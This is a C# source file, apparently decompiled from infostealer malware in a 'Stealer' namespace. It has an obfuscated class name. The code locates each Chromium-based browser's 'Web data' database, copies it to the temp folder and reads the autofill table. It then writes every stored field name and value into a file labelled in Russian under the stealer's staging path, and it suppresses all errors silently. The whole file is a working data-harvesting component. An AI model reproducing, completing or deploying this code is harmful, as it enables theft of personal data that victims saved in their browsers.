using System;
using System.IO;

namespace Stealer;

internal class QLevflljZWQAqd
{
	public static int count;

	public static void get()
	{
		try
		{
			string text = "Web data";
			string text2 = "";
			string text3 = "";
			string[] chromiumBasedBrowsers = Paths.chromiumBasedBrowsers;
			for (int i = 0; i < chromiumBasedBrowsers.Length; i++)
			{
				string text4 = Paths.GetUserData(chromiumBasedBrowsers[i]) + text;
				if (!File.Exists(text4))
				{
					continue;
				}
				text2 = Environment.GetEnvironmentVariable("temp") + "\\browserAutofill";
				if (File.Exists(text2))
				{
					File.Delete(text2);
				}
				File.Copy(text4, text2);
				SQLite sQLite = new SQLite(text2);
				sQLite.ReadTable("autofill");
				for (int j = 0; j < sQLite.GetRowCount(); j++)
				{
					string value = sQLite.GetValue(j, 0);
					string value2 = sQLite.GetValue(j, 1);
					if (string.IsNullOrEmpty(value2))
					{
						break;
					}
					text3 = text3 + "| Заполнение: " + Coding.GetUTF8(value + "\n");
					text3 = text3 + "| Значение: " + Coding.GetUTF8(value2) + "\n\n";
					count++;
				}
			}
			File.WriteAllText(Help.path_stealer + "Browsers\\AutoFill.txt", text3);
			File.Delete(Environment.GetEnvironmentVariable("temp") + "\\browserAutofill");
		}
		catch
		{
		}
	}
}
